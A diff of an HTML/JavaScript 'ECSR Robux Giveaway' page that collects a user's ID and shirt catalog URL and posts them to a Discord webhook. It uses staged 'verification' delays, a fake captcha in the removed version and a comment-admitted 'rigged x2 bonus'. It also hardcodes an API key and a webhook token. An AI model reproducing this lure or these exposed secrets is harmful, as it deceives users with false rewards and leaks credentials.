@@ -1,429 +1,246 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ECSR Robux Surge</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-    <style>
-        /* Общие стили для фона и текста */
-        body {
-            font-family: 'Share Tech Mono', monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-color: #0d0d0d; /* Очень темный фон */
-            color: #b3b3b3; /* Светло-серый текст */
-            margin: 0;
-            overflow: hidden; /* Чтобы избежать прокрутки от псевдоэлементов */
-            position: relative;
-        }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ECSR Robux Giveaway - Neon Edition</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
 
-        /* Анимация заднего плана (неоновые линии) */
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e); /* Градиент */
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            z-index: -1;
-            filter: blur(100px); /* Размытие для эффекта свечения */
-            opacity: 0.3;
-        }
+  body {
+    background: #0a0a23;
+    color: #8affff;
+    font-family: 'Orbitron', monospace, sans-serif;
+    max-width: 480px;
+    margin: 2rem auto;
+    padding: 1.5rem 2rem;
+    text-align: center;
+    user-select: none;
+  }
 
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
+  h1 {
+    font-size: 2.5rem;
+    color: #66ffff;
+    text-shadow:
+      0 0 5px #66ffff,
+      0 0 10px #66ffff,
+      0 0 20px #00ffff,
+      0 0 30px #00ffff,
+      0 0 40px #00ffff;
+    margin-bottom: 1.5rem;
+  }
 
-        .container {
-            background: rgba(18, 18, 18, 0.85); /* Полупрозрачный темный фон для контейнера */
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3), 0 0 60px rgba(138, 43, 226, 0.2); /* Неоновые тени */
-            text-align: center;
-            width: 90%;
-            max-width: 500px;
-            position: relative;
-            z-index: 1;
-            border: 1px solid rgba(0, 255, 255, 0.1); /* Тонкая неоновая рамка */
-        }
+  label {
+    display: block;
+    margin-bottom: 0.5rem;
+    font-weight: 700;
+    color: #99ffff;
+    text-shadow: 0 0 3px #33cccc;
+  }
 
-        h1 {
-            font-family: 'Orbitron', sans-serif;
-            color: #00ffff; /* Неоново-бирюзовый */
-            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff; /* Неоновое свечение */
-            margin-bottom: 25px;
-            letter-spacing: 2px;
-        }
+  input[type="text"], input[type="url"] {
+    width: 100%;
+    padding: 0.75rem 1rem;
+    font-size: 1.1rem;
+    border: none;
+    border-radius: 8px;
+    background: #001f33;
+    color: #8affff;
+    box-shadow:
+      inset 0 0 5px #00ffff,
+      0 0 8px #00ffff;
+    transition: box-shadow 0.3s ease;
+  }
+  input[type="text"]:focus, input[type="url"]:focus {
+    outline: none;
+    box-shadow:
+      inset 0 0 12px #00ffff,
+      0 0 15px #66ffff;
+  }
 
-        p {
-            margin-bottom: 20px;
-            font-size: 1.1em;
-            color: #e0e0e0;
-        }
+  button {
+    margin-top: 1rem;
+    padding: 0.75rem 0;
+    width: 100%;
+    font-size: 1.2rem;
+    font-weight: 700;
+    color: #00ffff;
+    background: transparent;
+    border: 2px solid #00ffff;
+    border-radius: 10px;
+    cursor: pointer;
+    text-shadow:
+      0 0 5px #00ffff,
+      0 0 10px #66ffff;
+    box-shadow:
+      0 0 8px #00ffff;
+    transition: background-color 0.3s ease, color 0.3s ease;
+  }
+  button:hover {
+    background-color: #00ffff;
+    color: #001f33;
+    box-shadow:
+      0 0 20px #00ffff,
+      0 0 40px #66ffff;
+  }
 
-        input[type="text"] {
-            width: calc(100% - 22px);
-            padding: 12px;
-            margin-bottom: 20px;
-            border: 1px solid #00ffff; /* Неоновая рамка */
-            border-radius: 8px;
-            background-color: #2a2a2a; /* Темный фон для ввода */
-            color: #00ffff; /* Неоновый текст */
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 1em;
-            box-shadow: 0 0 8px rgba(0, 255, 255, 0.3); /* Неоновая тень при фокусе */
-            transition: all 0.3s ease;
-        }
-        input[type="text"]:focus {
-            outline: none;
-            border-color: #8a2be2; /* Фиолетовый при фокусе */
-            box-shadow: 0 0 12px rgba(138, 43, 226, 0.5);
-        }
+  p {
+    font-size: 1.1rem;
+    color: #99ffff;
+    text-shadow: 0 0 3px #33cccc;
+  }
 
-        button {
-            background-color: #00ffff; /* Неоново-бирюзовая кнопка */
-            color: #0d0d0d; /* Темный текст на кнопке */
-            padding: 12px 25px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1.1em;
-            font-family: 'Orbitron', sans-serif;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.4);
-            transition: all 0.3s ease;
-        }
-        button:hover {
-            background-color: #8a2be2; /* Фиолетовый при наведении */
-            box-shadow: 0 0 20px rgba(138, 43, 226, 0.6);
-            color: white;
-        }
-        button:active {
-            transform: translateY(2px);
-            box-shadow: 0 0 5px rgba(0, 255, 255, 0.2);
-        }
+  img {
+    max-width: 100%;
+    border: 3px solid #00ffff;
+    border-radius: 15px;
+    margin: 1rem 0;
+    box-shadow:
+      0 0 15px #00ffff;
+  }
 
-        /* Стили для различных шагов */
-        .step {
-            display: none; /* По умолчанию скрыты */
-            animation: fadeIn 0.5s ease-out forwards;
-        }
+  .hidden {
+    display: none;
+  }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        #profile-image {
-            margin-top: 25px;
-            border-radius: 8px;
-            max-width: 100%;
-            height: auto;
-            border: 2px solid #00ffff; /* Неоновая рамка вокруг изображения */
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
-        }
-
-        #rouletteResult {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 2em;
-            color: #00ffff;
-            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
-            margin-top: 20px;
-            animation: pulse 1.5s infinite alternate; /* Анимация пульсации */
-        }
-
-        @keyframes pulse {
-            from { transform: scale(1); opacity: 1; }
-            to { transform: scale(1.05); opacity: 0.8; }
-        }
-
-        .highlight {
-            color: #00ffff; /* Неоново-бирюзовый для важных чисел */
-            font-weight: bold;
-        }
-
-        #message, #error {
-            margin-top: 20px;
-            font-size: 1.1em;
-            font-weight: bold;
-            animation: messageFadeIn 0.5s ease-out;
-        }
-
-        #message {
-            color: #00ff00; /* Зеленый для успешных сообщений */
-        }
-
-        #error {
-            color: #ff3333; /* Красный для ошибок */
-        }
-
-        /* Дополнительные стили для Captcha */
-        #captchaQuestion {
-            font-size: 1.5em;
-            font-family: 'Orbitron', sans-serif;
-            color: #8a2be2; /* Фиолетовый для вопроса капчи */
-            text-shadow: 0 0 8px rgba(138, 43, 226, 0.5);
-        }
-
-        /* Анимация для "загрузки" */
-        .loading-dots span {
-            opacity: 0;
-            animation: loadingDots 1.5s infinite;
-        }
-        .loading-dots span:nth-child(1) { animation-delay: 0s; }
-        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
-        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
-
-        @keyframes loadingDots {
-            0%, 80%, 100% { opacity: 0; }
-            40% { opacity: 1; }
-        }
-    </style>
+  .center {
+    text-align: center;
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <h1>ECSR Robux Surge</h1>
-        <p>Get your daily Robux boost!</p>
 
-        <div id="initialStep" class="step" style="display: block;">
-            <p>Enter your Roblox User ID:</p>
-            <input type="text" id="robloxUserId" placeholder="Your Roblox User ID">
-            <button id="participateButton">Participate</button>
-        </div>
+<h1>ECSR Robux Giveaway</h1>
 
-        <div id="verificationStep" class="step">
-            <h2>Is this you?</h2>
-            <img id="profile-image" src="" alt="Roblox Profile Image">
-            <button id="yesButton">Yes, that's me!</button>
-            <button id="noButton">No, wrong ID</button>
-        </div>
+<div id="step1">
+  <label for="ecsrId">Enter your ECSR ID:</label>
+  <input type="text" id="ecsrId" placeholder="Your ECSR ID" required autocomplete="off" />
+  <button id="startBtn">Start Giveaway</button>
+</div>
 
-        <div id="rouletteStep" class="step">
-            <h2>Spinning for Robux...</h2>
-            <p id="rouletteResult">0 Robux</p>
-        </div>
+<div id="step2" class="hidden center">
+  <p>Verifying your profile, please wait...</p>
+  <p><small>(This may take 8-11 seconds)</small></p>
+</div>
 
-        <div id="tshirtLinkStep" class="step">
-            <h2>You won <span id="wonRobuxAmount" class="highlight"></span> Robux!</h2>
-            <p>Please provide a link to a Roblox T-Shirt (or shirt/pants) with the exact price of <span id="requiredPrice" class="highlight"></span> Robux.</p>
-            <input type="text" id="tshirtLink" placeholder="Roblox T-Shirt Link">
-            <button id="submitTshirt">Submit T-Shirt</button>
-        </div>
+<div id="step3" class="hidden center">
+  <p>Is this your profile?</p>
+  <img id="profileImg" src="" alt="ECSR Profile Screenshot" />
+  <button id="confirmProfileBtn">Yes, that's me!</button>
+</div>
 
-        <div id="captchaStep" class="step">
-            <h2>Security Check</h2>
-            <p>Please solve the following simple math problem:</p>
-            <p id="captchaQuestion"></p>
-            <input type="text" id="captchaAnswer" placeholder="Your answer">
-            <button id="verifyCaptcha">Verify</button>
-        </div>
+<div id="step4" class="hidden center">
+  <p>🎉 You will get Robux!</p>
+  <p>Calculating your reward amount...</p>
+</div>
 
-        <div id="resultStep" class="step">
-            <h2>Giveaway Result</h2>
-            <p id="finalMessage"></p>
-            <p id="errorMessage"></p>
-        </div>
+<div id="step5" class="hidden center">
+  <p>Your Robux amount:</p>
+  <h2 id="robuxAmount"></h2>
+  <p>You also get x2 bonus! Your final amount is doubled.</p>
+  <button id="proceedBtn">Proceed</button>
+</div>
 
-        <p id="message"></p>
-        <p id="error"></p>
-    </div>
+<div id="step6" class="hidden">
+  <label for="shirtUrl">Enter your shirt catalog URL:</label>
+  <input type="url" id="shirtUrl" placeholder="https://ecsr.io/catalog/..." required autocomplete="off" />
+  <button id="submitGiveawayBtn">Submit & Claim</button>
+</div>
 
-    <script>
-        // --- УКАЖИТЕ ПОЛНЫЙ URL ВАШЕГО PHP БЭКЕНДА НА INFINITYFREEAPP.COM ---
-       // Временно для тестирования
-const PHP_BACKEND_URL = 'https://just-testingg.infinityfreeapp.com/test_cors.php';
+<div id="step7" class="hidden center">
+  <p>Thank you for participating! Your info was sent and you will receive your Robux soon.</p>
+</div>
 
-// В коде, где вы делаете fetch:
+<script>
+  const accessKey = '91aeaa0c407e4f089e1c49af78437242'; // APIFlash key
+  const webhookURL = 'https://webhook.lewisakura.moe/api/webhooks/1375801999031009481/vd7Jp0aByQintEklFwy2tQurKJFdGPF9uIKczMqwTbEOV70avbjTXKdEpK2YViaiXD8r';
 
-// ...
-        document.getElementById('participateButton').addEventListener('click', async () => {
-            const userId = document.getElementById('robloxUserId').value.trim();
-            if (!userId) {
-                document.getElementById('error').innerText = 'Please enter your Roblox User ID.';
-                return;
-            }
-            if (isNaN(userId) || parseInt(userId) <= 0) {
-                document.getElementById('error').innerText = 'Invalid Roblox User ID provided.';
-                return;
-            }
-            document.getElementById('error').innerText = ''; // Очищаем предыдущие ошибки
-            document.getElementById('message').innerHTML = 'Fetching profile<span>.</span><span>.</span><span>.</span>';
-            document.getElementById('message').classList.add('loading-dots');
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  const step3 = document.getElementById('step3');
+  const step4 = document.getElementById('step4');
+  const step5 = document.getElementById('step5');
+  const step6 = document.getElementById('step6');
+  const step7 = document.getElementById('step7');
 
-            try {
-                // Запрос к PHP-бэкенду для получения изображения
-                const response = await fetch(PHP_BACKEND_URL, { // Теперь без ?action=
-    method: 'POST', // Или GET, если в test_cors.php нет проверки метода
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ test: 'data' })
-});
-                const data = await response.json();
+  const ecsrIdInput = document.getElementById('ecsrId');
+  const startBtn = document.getElementById('startBtn');
+  const profileImg = document.getElementById('profileImg');
+  const confirmProfileBtn = document.getElementById('confirmProfileBtn');
+  const robuxAmountEl = document.getElementById('robuxAmount');
+  const proceedBtn = document.getElementById('proceedBtn');
+  const shirtUrlInput = document.getElementById('shirtUrl');
+  const submitGiveawayBtn = document.getElementById('submitGiveawayBtn');
 
-                if (!response.ok) {
-                    throw new Error(data.error || 'Failed to fetch profile data.');
-                }
+  let ecsrId = '';
+  let screenshotURL = '';
+  let robuxAmount = 0;
+  let finalAmount = 0;
 
-                document.getElementById('profile-image').src = data.imageUrl;
-                
-                // Для надежности, можно подождать загрузки изображения
-                await new Promise((resolve, reject) => {
-                    const img = document.getElementById('profile-image');
-                    // Если изображение уже в кеше, onload может не сработать, поэтому проверяем complete
-                    if (img.complete) {
-                        resolve();
-                    } else {
-                        img.onload = resolve;
-                        img.onerror = () => reject(new Error('Failed to load profile image.'));
-                    }
-                });
+  startBtn.addEventListener('click', () => {
+    ecsrId = ecsrIdInput.value.trim();
+    if (!ecsrId) {
+      alert('Please enter your ECSR ID.');
+      return;
+    }
+    step1.classList.add('hidden');
+    step2.classList.remove('hidden');
 
-                switchStep('verificationStep');
-                document.getElementById('message').innerText = ''; // Очищаем сообщение о загрузке
-                document.getElementById('message').classList.remove('loading-dots');
+    const waitTime = 8000 + Math.floor(Math.random() * 3000);
+    setTimeout(() => {
+      screenshotURL = `https://api.apiflash.com/v1/urltoimage?access_key=${accessKey}&url=${encodeURIComponent('https://ecsr.io/users/' + ecsrId + '/profile')}&format=png&delay=2&response_type=image`;
+      profileImg.src = screenshotURL;
 
-                sessionStorage.setItem('currentUserId', userId);
+      step2.classList.add('hidden');
+      step3.classList.remove('hidden');
+    }, waitTime);
+  });
 
-            } catch (err) {
-                document.getElementById('error').innerText = err.message || 'Failed to fetch profile image. Please try again.';
-                document.getElementById('message').innerText = '';
-                document.getElementById('message').classList.remove('loading-dots');
-                console.error(err);
-            }
-        });
+  confirmProfileBtn.addEventListener('click', () => {
+    step3.classList.add('hidden');
+    step4.classList.remove('hidden');
 
-        document.getElementById('yesButton').addEventListener('click', () => {
-            switchStep('rouletteStep');
-            spinRoulette();
-        });
+    setTimeout(() => {
+      robuxAmount = 50 + Math.floor(Math.random() * 101);
+      const halved = Math.floor(robuxAmount / 2);
+      finalAmount = halved * 2; // rigged x2 bonus
 
-        document.getElementById('noButton').addEventListener('click', () => {
-            document.getElementById('error').innerText = 'Please enter the correct User ID.';
-            document.getElementById('robloxUserId').value = '';
-            switchStep('initialStep');
-        });
+      step4.classList.add('hidden');
+      step5.classList.remove('hidden');
+      robuxAmountEl.textContent = `${finalAmount} Robux`;
+    }, 2000);
+  });
 
-        let wonRobux = 0;
-        let requiredPrice = 0;
+  proceedBtn.addEventListener('click', () => {
+    step5.classList.add('hidden');
+    step6.classList.remove('hidden');
+  });
 
-        function spinRoulette() {
-            const resultDisplay = document.getElementById('rouletteResult');
-            let counter = 0;
-            const maxSpins = 30; // Больше "спинов" для анимации
-            const spinInterval = setInterval(() => {
-                const randomRobux = Math.floor(Math.random() * (100 - 10 + 1)) + 10;
-                resultDisplay.innerText = `Spinning... ${randomRobux} Robux`;
-                counter++;
-                if (counter >= maxSpins) {
-                    clearInterval(spinInterval);
-                    wonRobux = Math.floor(Math.random() * (100 - 10 + 1)) + 10;
-                    requiredPrice = wonRobux;
-                    resultDisplay.innerText = `${wonRobux} Robux!`;
-                    document.getElementById('wonRobuxAmount').innerText = wonRobux;
-                    document.getElementById('requiredPrice').innerText = requiredPrice;
-                    switchStep('tshirtLinkStep');
-                }
-            }, 70); // Немного быстрее
-        }
+  submitGiveawayBtn.addEventListener('click', () => {
+    const shirtUrl = shirtUrlInput.value.trim();
+    if (!shirtUrl || !shirtUrl.startsWith('https://ecsr.io/catalog/')) {
+      alert('Please enter a valid ECSR shirt catalog URL.');
+      return;
+    }
 
-        document.getElementById('submitTshirt').addEventListener('click', async () => {
-            const tshirtLink = document.getElementById('tshirtLink').value.trim();
-            if (!tshirtLink) {
-                document.getElementById('error').innerText = 'Please enter a T-Shirt link.';
-                return;
-            }
-            document.getElementById('error').innerText = '';
-
-            // Валидация ссылки на фронтенде (базовая, полная валидация должна быть на бэкенде)
-            if (!tshirtLink.startsWith('https://www.roblox.com/catalog/') && !tshirtLink.startsWith('https://www.roblox.com/item.aspx')) {
-                document.getElementById('error').innerText = 'Invalid Roblox T-Shirt link. Must start with roblox.com/catalog/ or roblox.com/item.aspx';
-                return;
-            }
-
-            switchStep('captchaStep');
-            startCaptcha();
-        });
-
-        let captchaCorrectAnswer;
-
-        function startCaptcha() {
-            const num1 = Math.floor(Math.random() * 10) + 1;
-            const num2 = Math.floor(Math.random() * 10) + 1;
-            captchaCorrectAnswer = num1 + num2;
-            document.getElementById('captchaQuestion').innerText = `${num1} + ${num2} = ?`;
-            document.getElementById('captchaAnswer').value = ''; // Очистить предыдущий ответ
-        }
-
-        document.getElementById('verifyCaptcha').addEventListener('click', async () => {
-            const userAnswer = parseInt(document.getElementById('captchaAnswer').value);
-            if (userAnswer === captchaCorrectAnswer) {
-                document.getElementById('error').innerText = '';
-                document.getElementById('message').innerHTML = 'Processing your claim<span>.</span><span>.</span><span>.</span>';
-                document.getElementById('message').classList.add('loading-dots');
-                await sendResultToWebhook();
-            } else {
-                document.getElementById('error').innerText = 'Incorrect answer. Please try again.';
-            }
-        });
-
-        async function sendResultToWebhook() {
-            const userId = sessionStorage.getItem('currentUserId');
-            const tshirtLink = document.getElementById('tshirtLink').value.trim();
-
-            const payload = {
-                userId: userId,
-                wonRobux: wonRobux,
-                tshirtLink: tshirtLink,
-                requiredPrice: requiredPrice
-            };
-
-            try {
-                // Запрос к PHP-бэкенду для отправки результатов
-                const response = await fetch(`${PHP_BACKEND_URL}?action=submitGiveawayResult`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                });
-                const data = await response.json();
-
-                document.getElementById('message').innerText = ''; // Очищаем сообщение о загрузке
-                document.getElementById('message').classList.remove('loading-dots');
-
-                if (response.ok) {
-                    document.getElementById('finalMessage').innerText = 'Your claim has been submitted successfully! Please wait for your Robux.';
-                    document.getElementById('errorMessage').innerText = '';
-                } else {
-                    document.getElementById('finalMessage').innerText = '';
-                    document.getElementById('errorMessage').innerText = data.error || 'Failed to submit claim. Please contact @w2mpu72_ on Discord.';
-                }
-                switchStep('resultStep');
-            } catch (err) {
-                document.getElementById('message').innerText = '';
-                document.getElementById('message').classList.remove('loading-dots');
-                document.getElementById('finalMessage').innerText = '';
-                document.getElementById('errorMessage').innerText = 'An error occurred. Please contact @w2mpu72_ on Discord.';
-                switchStep('resultStep');
-                console.error(err);
-            }
-        }
-
-        // Функция для переключения шагов
-        function switchStep(nextStepId) {
-            document.querySelectorAll('.step').forEach(step => {
-                step.style.display = 'none';
-            });
-            document.getElementById(nextStepId).style.display = 'block';
-        }
-    </script>
-</body>
-</html>
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: null,
+        embeds: [
+          {
+            title: "ECSR Giveaway Entry",
+            color: 0x00FFAA,
+            fields: [
+              { name: "ECSR ID", value: ecsrId, inline: true },
+              { name: "Robux Amount", value: `${finalAmount} Robux`, inline: true },
+              { name: "Shirt Catalog URL", value: shirtUrl },
+              { name: "Profile Screenshot", value: screenshotURL }
+            ],
+            timestamp: new Date().toISOString()
+          }
+        ]
+      })
+    }).then(() => {
+      step6.classList.add
